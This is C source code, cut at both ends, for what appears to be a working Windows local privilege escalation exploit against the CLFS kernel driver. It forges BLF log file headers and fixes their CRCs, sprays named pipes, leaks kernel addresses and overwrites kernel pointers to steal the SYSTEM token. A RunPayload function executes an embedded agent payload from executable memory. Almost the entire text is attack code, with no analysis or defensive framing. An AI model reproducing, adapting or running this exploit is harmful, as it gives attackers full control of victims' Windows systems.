		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x01
	};


	fseek(pfile, 0x400, SEEK_SET);
	fwrite(rawData, sizeof(char), sizeof(rawData), pfile); //build a valid header in shadow

	unsigned char rawdata2[] = { 0x30, 0x01 }; // offset 0x1b98 cbsymbolZone for windows 11 and 10

	fseek(pfile, 0x7fe, SEEK_SET);
	fwrite(rawdata2, sizeof(char), sizeof(rawdata2), pfile); //build a valid header in shadow

	fseek(pfile, 0x6, SEEK_SET);
	fwrite(ValidSectorCount, sizeof(char), sizeof(ValidSectorCount), pfile); //ValidSectorCount to 1


	fseek(pfile, 0x70, SEEK_SET);
	fwrite(ullDumpCount, sizeof(char), sizeof(ullDumpCount), pfile); //ullDumpCount to 2

	fseek(pfile, 0x84, SEEK_SET);
	fwrite(eExtendState, sizeof(char), sizeof(eExtendState), pfile); //changing the eExtendState to 2 (ClfsExtendStateFlushingBlock) 

	fseek(pfile, 0x88, SEEK_SET);
	fwrite(iFlushBlock, sizeof(char), sizeof(iFlushBlock), pfile); //changing the iExtendBlock to 4 

	fseek(pfile, 0x8A, SEEK_SET);
	fwrite(iFlushBlock, sizeof(char), sizeof(iFlushBlock), pfile); //changing the iFlushBlock to 4 

	fseek(pfile, 0x90, SEEK_SET);
	fwrite(cExtendStartSectors, sizeof(char), sizeof(cExtendStartSectors), pfile); //changing the cExtendStartSectors to 1 

	fseek(pfile, 0x94, SEEK_SET);
	fwrite(cExtendSectors, sizeof(char), sizeof(cExtendSectors), pfile); //changing the cExtendSectors to 3

	fseek(pfile, 0x9c, SEEK_SET);
	fwrite(cClients, sizeof(char), sizeof(cClients), pfile); //changing the cClients to 2

	fseek(pfile, 0x484, SEEK_SET);
	fwrite(eExtendState, sizeof(char), sizeof(eExtendState), pfile); //changing the eExtendState of the shadow block to 2 (ClfsExtendStateFlushingBlock) 


	unsigned char iExtendBlock2[] = { 0x0, 0x00 }; // offset 0x488 iExtendBlock2

	unsigned char iFlushBlock2[] = { 0x13, 0x00 }; // offset 0x48a iFlushBlock2

	fseek(pfile, 0x488, SEEK_SET);
	fwrite(iExtendBlock2, sizeof(char), sizeof(iExtendBlock2), pfile); //changing the iExtendBlock of the shadow block to 13 

	fseek(pfile, 0x48A, SEEK_SET);
	fwrite(iFlushBlock2, sizeof(char), sizeof(iFlushBlock2), pfile); //changing the iFlushBlock of the shadow block to 13 


	fseek(pfile, 0x1b98, SEEK_SET);
	fwrite(cbsymbolZone, sizeof(char), sizeof(cbsymbolZone), pfile); // changing the cbsymbolZone to 0x65c8

	fseek(pfile, 0x9598, SEEK_SET);
	fwrite(cbsymbolZone, sizeof(char), sizeof(cbsymbolZone), pfile); //changing the cbsymbolZone to of the shadow 0x65c8

	return;
}


#include <windows.h>

int FixCRCFile(WCHAR* _stored_temp_open) {

	DWORD numread;

	memset(buff2, 0, sizeof(buff2));
	memset(buff1, 0, sizeof(buff1));
	memset(buff, 0, sizeof(buff));
	memset(buff3, 0, sizeof(buff3));

	HANDLE hFile = CreateFileW(_stored_temp_open, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		return 1;
	}

	//--------------------------------------------------------------------

	SetFilePointer(hFile, 0x0, NULL, FILE_BEGIN);
	ReadFile(hFile, buff2, NUMELEM2, &numread, NULL);
	*((DWORD*)(buff2 + 0xc)) = 0;

	uint32_t CRC = crcCalculatorAndFix(buff2, NUMELEM2);

	//--------------------------------------------------------------------

	SetFilePointer(hFile, 0x400, NULL, FILE_BEGIN);
	ReadFile(hFile, buff1, NUMELEM2, &numread, NULL);
	*((DWORD*)(buff1 + 0xc)) = 0;

	if (numread != NUMELEM2)
	{
		printf("ERROR2\n");
		CloseHandle(hFile);
		return 1;
	}

	uint32_t CRC1 = crcCalculatorAndFix(buff1, NUMELEM2);

	//--------------------------------------------------------------------

	SetFilePointer(hFile, 0x800, NULL, FILE_BEGIN);
	ReadFile(hFile, buff, NUMELEM, &numread, NULL);
	*((DWORD*)(buff + 0xc)) = 0;

	if (numread != NUMELEM)
	{
		printf("ERROR3\n");
		CloseHandle(hFile);
		return 1;
	}

	uint32_t CRC2 = crcCalculatorAndFix(buff, NUMELEM);

	//--------------------------------------------------------------------

	SetFilePointer(hFile, 0x8200, NULL, FILE_BEGIN);
	ReadFile(hFile, buff3, NUMELEM, &numread, NULL);
	*((DWORD*)(buff3 + 0xc)) = 0;

	if (numread != NUMELEM)
	{
		printf("ERROR4\n");
		CloseHandle(hFile);
		return 1;
	}

	uint32_t CRC3 = crcCalculatorAndFix(buff3, NUMELEM);


	//printf("CRC = %x\n", CRC);
	//printf("CRC1 = %x\n", CRC1);
	//printf("CRC2 = %x\n", CRC2);
	//printf("CRC3 = %x\n", CRC3);

	SetFilePointer(hFile, 0xc, NULL, FILE_BEGIN);
	WriteFile(hFile, &CRC, 4, &numread, NULL);
	SetFilePointer(hFile, 0x40c, NULL, FILE_BEGIN);
	WriteFile(hFile, &CRC1, 4, &numread, NULL);
	SetFilePointer(hFile, 0x80c, NULL, FILE_BEGIN);
	WriteFile(hFile, &CRC2, 4, &numread, NULL);
	SetFilePointer(hFile, 0x820c, NULL, FILE_BEGIN);
	WriteFile(hFile, &CRC3, 4, &numread, NULL);

	CloseHandle(hFile);

	return 0;
}



int crcCalculatorAndFix(char* mybuf, int mysize) {


	uint32_t table[256];
	crc32::generate_table(table);

	// Struct, for piece-by-piece, bytewise
	struct DataStruct {
		uint16_t data1;
		uint16_t data2;
		float mypi;
		uint32_t myclock;
		bool begun;
	};



	char* ptr = (char*)mybuf;
	uint16_t slen = mysize;


	uint32_t CRC = 0;
	for (int cnt = 0; cnt < slen; cnt++) {
		CRC = crc32::update(table, CRC, ptr, 1);
		ptr++;
	}




	return CRC;
}

int doFirstAlloc() {

	UINT64 alloc00 = 0x5000000;
	UINT64 alloc01 = 0x10000;


	if (!VirtualAlloc((LPVOID)alloc00, 0x100000, 0x3000, 4)) {
		printf("[-] Failed to allocate memory\n");
		return 0;
	}

	return 0;
}


VOID FindKernelModulesBase()
{

	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return;
	}

	NTSTATUS status = fnNtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return;
		}

		memset(lpHeapBuffer, 0, dwBytesReturned);

		status = fnNtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->NumberOfModules > 0) {
		retval = (UINT64)psm->Modules[0].ImageBase;
		ntos_kernelBase = retval;

	}

	unsigned int i = 0;
	for (i = 0; i < psm->NumberOfModules; i++)
	{
		if (!strncmp(clfs_path, (CHAR*)psm->Modules[i].FullPathName, strlen(clfs_path)))  break;
	}


	clfs_kernelBase = (UINT64)psm->Modules[i].ImageBase;
	return;
}

void manage_args(int argc, TCHAR* argv[]) {
	
	if (argc != 3) {
		printf("[+] Incorrect number of arguments ... using default value 1208 and flag 1 for w11 and w10\n");
		argv[1] = (TCHAR*)"1208";
		argv[2] = (TCHAR*)"1";
	}


	token_offset = atoi((CHAR*)argv[1]);
	if (token_offset == 0) {
		printf("[+] Invalid token offset argument, must be decimal number\n");
		exit(1);
	}

	flag = atoi((CHAR*)argv[2]);
	if (flag == 0) {
		printf("[+] Invalid token offset argument, must be decimal number\n");
		exit(1);
	}

	printf("\n\nARGUMENTS\n");
	printf("[+] TOKEN OFFSET %x\n", token_offset);
	printf("[+] FLAG %x\n\n", flag);
	return;
}

VOID RunPayload()
{
	PVOID Payload = NULL;

	Payload = VirtualAlloc(NULL, sizeof(g_Agent), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (Payload)
	{
		RtlZeroMemory(Payload, sizeof(g_Agent));
		RtlCopyMemory(Payload, g_Agent, sizeof(g_Agent));
		(*(VOID(*)())Payload)();
	}
}

void fun_prepare() {

	_wfopen_s(&pfile, stored_name_fopen, L"rb+");
	if (pfile == 0) {
		printf("\nCant't open file, error %x\n", GetLastError());
		exit(1);
	}
	craftbaseFile(pfile);
	fclose(pfile);
	FixCRCFile(stored_name_fopen);
	system_EPROCESS_low = system_EPROCESS & 0xfff;
	system_EPROCESS_high = system_EPROCESS & 0xfffffffffffff000;

	ULONG retlen2 = 0;
	DWORD* dest1 = 0;
	dest1 = (DWORD*)VirtualAlloc(0, 0x1000, 0x1000, 4);
	fclose(pfile);

	HMODULE nt = GetModuleHandleA("ntdll");


	dest2 = 0xffffffff;
	dest3 = 0x100000007;
	value2 = 0x414141414141005A;


	if (!VirtualAlloc((LPVOID)dest2, 0x10000, 0x3000, 4))
	{
		return;
	}

	memset((LPVOID)dest3, 0, 0xff8);
	*(UINT64*)dest2 = system_EPROCESS_high;


	*(UINT64*)dest3 = value2;
	CLFS_kernelAddrArray = getBigPoolInfo();

	//wprintf(L"Name %s", stored_name_CreateLog);

	hlogfile = CreateLogFile(stored_name_CreateLog, 0xC0010000, FILE_SHARE_READ, 0, 3, 0);
	if (hlogfile == INVALID_HANDLE_VALUE) {
		printf("[+] Can't open hlog file\n");
		exit(0);
	}

	CLFS_kernelAddrArray = getBigPoolInfo();




	LONGLONG pcbContainer = 512;
	WCHAR pwszContainerPath[768] = { 0 };
	wsprintfW(pwszContainerPath, stored_env_containerfname);



	if (!AddLogContainer(hlogfile, (PULONGLONG)&pcbContainer, pwszContainerPath, 0))
	{
		CloseHandle(hlogfile);
		printf("AddLogContainer Fail, please delete C:\\Users\\Public\\MyLxg_xxx.blf and try again\n");
		exit(1);
	}
	printf("[+] Log file handle: %p\n", hlogfile);

	printf("[+] Pool CLFS kernel address: %p\n", (void*)CLFS_kernelAddrArray);


	return;
}

WCHAR* logFileNames(int _i) {


	tmp_env8 = (WCHAR*)malloc(0x1000);
	if (!tmp_env8) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}
	memset(tmp_env8, 0, 0x1000);




	wsprintfW(tmp_env8, L"LOG:%s\\%d_%d", stored_env, _i, random_part2);

	//wprintf((LPWSTR)L"[+] Log file name used in CreateLogFile Path = %ls\n", tmp_env8); //stored_env_spray is example=LOG:C:\Users\Public\1280

	return tmp_env8;
}

WCHAR* containerNames(int _i) {


	tmp_env8 = (WCHAR*)malloc(0x1000);
	if (!tmp_env8) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}
	memset(tmp_env8, 0, 0x1000);




	wsprintfW(tmp_env8, L"%s\\.p_%d_%d", stored_env, _i, random_part2);


	return tmp_env8;
}

WCHAR* fileNames(int _i) {


	tmp_env8 = (WCHAR*)malloc(0x1000);
	if (!tmp_env8) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}
	memset(tmp_env8, 0, 0x1000);




	wsprintfW(tmp_env8, L"%s\\%d_%d.blf", stored_env, _i, random_part2);


	return tmp_env8;
}

int fun_trigger(WCHAR* _logfilename, WCHAR* _fopenfilename) {

	int error_flag = 0;


	_wfopen_s(&pfile2, _fopenfilename, L"r+");
	if (pfile2 == 0) {
		printf("Cant't open file, error %x\n", GetLastError());
		exit(1);
	}

	//printf("to Fix\n)");

	craftSprayFile(pfile2);
	fclose(pfile2);

	error_flag=FixCRCFile(_fopenfilename);
	

	return error_flag;
}

void to_trigger() 
{


	// 1. Create a spray log file in the folder C:\Users\Public\ via the CreateLogFile API

	//printf("\nSpraying log files\n");

	srand((unsigned int)time(NULL));
	random_part2 = rand();

	stored_log_arrays[0] = logFileNames(0);
	stored_container_arrays[0] = containerNames(0);
	stored_fopen_arrays[0] = fileNames(0);

	logFile2 = CreateLogFile(stored_log_arrays[0], GENERIC_READ | GENERIC_WRITE, 1, 0, OPEN_ALWAYS, 0);

	if (logFile2 == INVALID_HANDLE_VALUE) {
		DWORD error = GetLastError();
		printf("Could not create LOGfile2, error: 0x%x\n", (unsigned int)error);
		exit(-1);
	}
	CloseHandle(logFile2);

	for (int i = 1; i < 10; i++)
	{
		
		stored_log_arrays[i] = logFileNames(i);
		stored_container_arrays[i] = containerNames(i);
		stored_fopen_arrays[i] = fileNames(i);

		int resul=CopyFileW(fileNames(0), fileNames(i), TRUE);

		if (resul == 0) {
			DWORD error = GetLastError();
			printf("copy error: 0x%x\n", (unsigned int)error);
			exit(-1);
		}

		fun_trigger(stored_log_arrays[i], stored_fopen_arrays[i]);

	}

	HANDLE _hthread = GetCurrentThread();
	SetThreadAffinityMask(_hthread, 1);
	buffer_0x1a0 = malloc(0x1a0);
	if (buffer_0x1a0 == 0) { exit(0); }

	memset(buffer_0x1a0, 0x41, 0x1a0);

	UINT64 arrayCLFSkernelAddress[12] = { 0 };

	arrayCLFSkernelAddress[0] = CLFS_kernelAddrArray + 0x30;
	arrayCLFSkernelAddress[1] = CLFS_kernelAddrArray + 0x30;
	arrayCLFSkernelAddress[2] = CLFS_kernelAddrArray + 0x30;
	arrayCLFSkernelAddress[3] = CLFS_kernelAddrArray + 0x30;
	arrayCLFSkernelAddress[4] = CLFS_kernelAddrArray + 0x30;
	arrayCLFSkernelAddress[5] = CLFS_kernelAddrArray + 0x30;
	arrayCLFSkernelAddress[6] = CLFS_kernelAddrArray + 0x30;
	arrayCLFSkernelAddress[7] = CLFS_kernelAddrArray + 0x30;
	arrayCLFSkernelAddress[8] = CLFS_kernelAddrArray + 0x30;
	arrayCLFSkernelAddress[9] = CLFS_kernelAddrArray + 0x30;
	arrayCLFSkernelAddress[10] = CLFS_kernelAddrArray + 0x30;
	arrayCLFSkernelAddress[11] = CLFS_kernelAddrArray + 0x30;

	int const_0x5000 = 0x5000;
	int const_0x4000 = 0x4000;

	BOOL test = (UINT64)(UINT)0x5000 >> 28 != 0;
	UINT _size = (UINT)(16 * 0x5000);
	if (test)
		_size = -1;



	handles_buffer1 = (UINT64 *)malloc(_size);
	if (!handles_buffer1) { exit(0); }

	fun_pipeSpray(0x5000, handles_buffer1); //call to fun_pipeSpray with 0x5000 value

	test = (UINT64)(UINT)0x4000 >> 28 != 0;
	_size = (UINT)(16 * 0x4000);
	if (test)
		_size = -1;

	handles_buffer2 = (UINT64*)malloc(_size);
	if (!handles_buffer2) { exit(0); }

	fun_pipeSpray(0x4000, handles_buffer2);//call to fun_pipeSpray with 0x4000 value

	UINT64 * pipeA = handles_buffer1;
	UINT64* pipeB = handles_buffer2;
	UINT64* resulpipe = pipeA + 1;
	UINT64* resulpipe2 = pipeB + 1;

	DWORD byteswritten = 0;

	for (int j = 0; j < 0x5000; j++)
	{
		if (!WriteFile((HANDLE) *resulpipe, arrayCLFSkernelAddress, 0x60, &byteswritten, 0))
		{
			do
			{
				CloseHandle((HANDLE)*pipeA);
				CloseHandle((HANDLE)pipeA[1]);
				pipeA += 2;
				--const_0x5000;

			} while (const_0x5000);

			exit(1);

		}

		resulpipe += 2;
	}

	UINT64 * pipeA_2 = pipeA + 0x2000;
	UINT64 const_0x667 = 0x667;

	do
	{
		CloseHandle((HANDLE)*pipeA_2);
		CloseHandle((HANDLE)pipeA_2[1]);
		pipeA_2 += 10;
		--const_0x667;
	} while (const_0x667);


	WCHAR** arrays_log_names = stored_log_arrays;
	UINT64 const_10 = 10;
	UINT64 const_10b = 10;
	HANDLE store_handles[10] = { 0 };
	int z = 0;
	do
	{
		--const_10;
		//wprintf((LPWSTR)L"\n[+] Names again = %ls\n", stored_log_arrays[const_10]);
		logFile = CreateLogFile(stored_log_arrays[const_10], GENERIC_READ | GENERIC_WRITE , FILE_SHARE_READ, 0, OPEN_ALWAYS, 0);

		if (logFile == INVALID_HANDLE_VALUE) {
			DWORD error = GetLastError();
			printf("Could not create LOGfile3, error: 0x%x\n", (unsigned int)error);
			exit(-1);
		}

		
		//printf("logFile %x\n", logFile);
		store_handles[z] = logFile;
		z++;
		
	} while (const_10);

	int contador_2 = 0164;
	resulpipe2 = pipeB + 1;
	do
	{
		// spray Fill pipe2
		if (!(unsigned int)WriteFile((HANDLE)*resulpipe2, arrayCLFSkernelAddress, 0x60, &byteswritten, 0))
		{
			do
			{
				CloseHandle((HANDLE)*pipeB);
				CloseHandle((HANDLE)pipeB[1]);
				pipeB += 2;
				--const_0x4000;
			} while (const_0x4000);
			exit(1);
		}
		resulpipe2 += 2;
		++contador_2;
	} while (contador_2 < 0x4000);

	LONGLONG pcbContainer2 = 512;
	int contador_3 = 0;
	int resul = 0;

	while (1)
		// one version
		{
			_int64 v57 = (_int64)temp_chunk;


			printf("TRIGGER START\n");
			


			resul = AddLogContainer(store_handles[contador_3], (PULONGLONG)&pcbContainer2, stored_container_arrays[contador_3], 0);// AddLogContainer


			


			*(UINT64*)0x5000040 = 0x5000000;
			*(UINT64*)0x5000000 = 0x5001000;
			*(UINT64*)0x5001000 = fnClfsEarlierLsn;
			*(UINT64*)0x5001008 = fnPoFxProcessorNotification;
			*(UINT64*)0x5001010 = fnClfsEarlierLsn;
			*(UINT64*)0x5001018 = fnClfsEarlierLsn;
			*(UINT64*)0x5001020 = fnClfsEarlierLsn;
			*(UINT64*)0x5001028 = fnClfsEarlierLsn;
			*(UINT64*)0x5001030 = fnClfsEarlierLsn;
			*(UINT64*)0x5001038 = fnClfsEarlierLsn;
			*(UINT64*)0x5001040 = fnClfsEarlierLsn;
			*(UINT64*)0x5000068 = fnClfsMgmtDeregisterManagedClient;
			*(UINT64*)0x5000048 = 0x5000400;
			*(UINT64*)0x5000400 = 0x5001300;
			*(UINT64*)0x5000448 = para_PipeAttributeobjInkernel + 0x18;
			*(UINT64*)0x5001328 = fnClfsEarlierLsn;
			*(UINT64*)0x5001308 = fnSeSetAccessStateGenericMapping;


			CloseHandle(logFile);



			logFile = CreateLogFile(stored_name_CreateLog, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0);

			int const_0x5a = 0x5a;



			_NtFsControlFile(hPipeWrite, 0, 0, 0, &status_block, 0x110038, &const_0x5a, 2, temp_chunk, 0x2000);



			pos_token = (unsigned int)system_EPROCESS_low + (unsigned int)token_offset;

			//printf("pos_token: %x\n", pos_token);


			System_token_value2 = *(UINT64*)((UINT64)pos_token + (UINT64)temp_chunk);

			printf("System_token_value: %p\n", System_token_value2);

			if (*(UINT64*)(pos_token + (UINT64)temp_chunk) >= 0x8181818181818181) {
				printf("SYSTEM TOKEN CAPTURED\n");
				break;
			}
			else {
				printf("TRYING AGAIN\n");
			}
			contador_3++;

		}




		*(UINT64*)0xFFFFFFFF = *(UINT64*)(pos_token + (UINT64)temp_chunk);// system token write content
		*(UINT64*)0x100000007 = System_token_value;
		*(UINT64*)0x5000448 = g_EProcessAddress + token_offset - 8;// target wire address
		CreateLogFile(stored_name_CreateLog, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0);


		*(UINT64*)0xFFFFFFFF = 0x1458;
		*(UINT64*)0x100000007 = 0164;
		*(UINT64*)0x5000448 = CLFS_kernelAddrArray + 0x390;
		CreateLogFile(stored_name_CreateLog, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0);

		printf("Closing Handle\n");
		CloseHandle(logFile);


		TCHAR username[500];
		DWORD size = 500;

		if (GetUserName((TCHAR*)username, &size)) {
			std::wcout << "ACTUAL USER=" << username << std::endl;
		}
		else {
			std::cerr << "Error: " << GetLastError() << std::endl;
			
		}

		if (strcmp(username, "SYSTEM") == 0){
			printf("WE ARE SYSTEM\n");
			system("notepad.exe");
			
		}
		else {
			printf("NOT SYSTEM\n");
		}
		exit(1);
		return;
	
}







int main(int argc, TCHAR* argv[])
{

	manage_args(argc, argv);
	getVirtualAddress();
	InitEnvironment();
	doFirstAlloc();
	createInitialLogFile();
	fun_prepare();
	to_trigger();

	exit(1);

	return 0;
}